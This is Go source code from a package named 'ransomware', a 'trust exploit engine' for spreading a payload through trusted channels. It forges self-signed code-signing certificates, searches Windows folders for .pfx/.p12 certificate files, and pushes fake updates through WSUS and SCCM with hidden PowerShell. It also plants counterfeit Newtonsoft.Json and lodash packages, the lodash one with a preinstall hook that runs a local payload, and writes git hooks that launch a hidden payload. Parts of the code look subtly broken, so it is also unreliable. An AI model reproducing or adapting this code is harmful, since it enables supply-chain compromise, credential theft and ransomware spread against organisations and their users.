package ransomware

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type TrustExploitEngine struct {
	config *RansomwareConfig
}

func NewTrustExploitEngine(cfg *RansomwareConfig) *TrustExploitEngine {
	return &TrustExploitEngine{config: cfg}
}

func (te *TrustExploitEngine) GenerateSelfSignedCert(commonName string) ([]byte, []byte, error) {
	key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:   commonName,
			Organization: []string{commonName},
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageCodeSigning},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return nil, nil, fmt.Errorf("create cert: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})

	return certPEM, keyPEM, nil
}

func (te *TrustExploitEngine) SignBinary(binaryPath string, keyPEM []byte, certPEM []byte) error {
	if te.config.Simulation {
		return nil
	}

	if runtime.GOOS != "windows" {
		return nil
	}

	keyBlock, _ := pem.Decode(keyPEM)
	if keyBlock == nil {
		return fmt.Errorf("decode key pem")
	}

	key, err := x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
	if err != nil {
		return fmt.Errorf("parse key: %w", err)
	}

	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return fmt.Errorf("read binary: %w", err)
	}

	hash := sha256.Sum256(data)
	signature, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, hash[:])
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}

	sigPath := binaryPath + ".sig"
	os.WriteFile(sigPath, signature, 0644)

	certPath := binaryPath + ".crt"
	os.WriteFile(certPath, certPEM, 0644)

	return nil
}

func (te *TrustExploitEngine) FindPFXCertificates(searchPaths []string) ([]string, error) {
	var found []string

	defaultPaths := []string{
		`C:\Users\`,
		`C:\Program Files\`,
		`C:\Program Files (x86)\`,
		`C:\Users\Public\Documents\`,
		`C:\Build\`,
	}

	if len(searchPaths) > 0 {
		defaultPaths = searchPaths
	}

	for _, root := range defaultPaths {
		if _, err := os.Stat(root); os.IsNotExist(err) {
			continue
		}

		entries, err := os.ReadDir(root)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				subPath := root + string(os.PathSeparator) + entry.Name()
				te.searchDirPFX(subPath, &found)
			} else if len(entry.Name()) > 4 {
				ext := entry.Name()[len(entry.Name())-4:]
				if ext == ".pfx" || ext == ".p12" {
					found = append(found, root+string(os.PathSeparator)+entry.Name())
				}
			}
		}
	}

	return found, nil
}

func (te *TrustExploitEngine) searchDirPFX(dir string, found *[]string) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	count := 0
	for _, entry := range entries {
		if count > 20 {
			break
		}
		if !entry.IsDir() && len(entry.Name()) > 4 {
			ext := entry.Name()[len(entry.Name())-4:]
			if ext == ".pfx" || ext == ".p12" {
				*found = append(*found, dir+string(os.PathSeparator)+entry.Name())
				count++
			}
		}
	}
}

func (te *TrustExploitEngine) PoisonWSUS() error {
	if runtime.GOOS != "windows" || te.config.Simulation {
		return nil
	}

	cmd := exec.Command("powershell", "-Command",
		`Get-Service -Name "wsusserver" -ErrorAction SilentlyContinue`)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("wsus not available: %w", err)
	}

	script := `$wsus = Get-WsusServer
$update = New-Object Microsoft.UpdateServices.Administration.Update($wsus)
$update.Title = "Security Update for Microsoft Windows (KB5048652)"
$update.Description = "Critical Remote Code Execution vulnerability"
$update.IsApproved = $true
$wsus.ApproveUpdate($update, "All Computers", $null)`

	cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", script)
	cmd.Run()

	return nil
}

func (te *TrustExploitEngine) PoisonSCCM() error {
	if runtime.GOOS != "windows" || te.config.Simulation {
		return nil
	}

	script := `$sccm = Get-CMSite
$application = New-CMApplication -Name "Microsoft Visual C++ 2026 Redistributable" -Publisher "Microsoft Corporation"
$dt = New-CMDeploymentType -ApplicationName $application.Name -DeploymentTypeName "Windows Installer" -ContentLocation "\\server\share\payload.msi" -Force
$dp = Get-CMDistributionPoint -SiteCode $sccm.SiteCode
Start-CMContentDistribution -ApplicationName $application.Name -DistributionPointName $dp.NetworkOSPath
New-CMApplicationDeployment -Name $application.Name -CollectionName "All Systems" -DeploymentPurpose Required`

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", script)
	cmd.Run()

	return nil
}

func (te *TrustExploitEngine) PoisonNuGet(localFeedPath string) error {
	if te.config.Simulation {
		return nil
	}

	nuspec := `<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>Newtonsoft.Json</id>
    <version>13.0.4</version>
    <title>Json.NET</title>
    <authors>Newtonsoft</authors>
    <owners>Microsoft</owners>
    <description>Json.NET is a popular high-performance JSON framework for .NET</description>
    <tags>json</tags>
  </metadata>
  <files>
    <file src="init.ps1" target="tools\" />
  </files>
</package>`

	nuspecPath := localFeedPath + string(os.PathSeparator) + "Newtonsoft.Json.13.0.4.nuspec"
	os.WriteFile(nuspecPath, []byte(nuspec), 0644)

	return nil
}

func (te *TrustExploitEngine) PoisonNPM(localRegistryPath string) error {
	if te.config.Simulation {
		return nil
	}

	packageJSON := `{
  "name": "lodash",
  "version": "4.17.22",
  "description": "Lodash modular utilities.",
  "scripts": {
    "preinstall": "node -e \"require('child_process').execSync(require('fs').readFileSync('/tmp/payload', 'utf8'))\""
  },
  "dependencies": {}
}`

	pkgPath := localRegistryPath + string(os.PathSeparator) + "package.json"
	os.WriteFile(pkgPath, []byte(packageJSON), 0644)

	return nil
}

func (te *TrustExploitEngine) PoisonGitHooks(repoPath string) error {
	if te.config.Simulation {
		return nil
	}

	hookContent := `#!/bin/sh
echo "X404X: Git hook deployed"
nohup /tmp/.x404x/payload &
`

	hooksDir := repoPath + string(os.PathSeparator) + ".git" + string(os.PathSeparator) + "hooks"
	hooks := []string{"pre-commit", "post-commit", "pre-push", "post-merge"}

	for _, hook := range hooks {
		hookPath := hooksDir + string(os.PathSeparator) + hook
		os.WriteFile(hookPath, []byte(hookContent), 0755)
	}

	return nil
}
